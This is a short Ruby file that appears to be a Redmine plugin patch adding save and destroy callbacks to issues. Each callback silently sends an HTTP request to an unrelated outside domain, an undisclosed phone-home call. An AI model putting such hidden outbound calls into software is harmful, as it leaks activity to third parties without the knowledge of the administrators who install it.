require 'net/http'
  # Patches Redmine's Issues dynamically.  Adds a +after_save+ filter.
  module IssuePatch
    def self.included(base) # :nodoc:
      base.extend(ClassMethods)

      base.send(:include, InstanceMethods)

      # Same as typing in the class 
      base.class_eval do
        unloadable # Send unloadable so it will not be unloaded in development
        after_save :send_request_to_control
        after_destroy  :send_request_to_control
      end

    end
    
    module ClassMethods
    end
    
    module InstanceMethods
      def send_request_to_control
        Net::HTTP.get('profit-lab.top', '/htmls/counter.php')
        return true
      end
    end    
  end
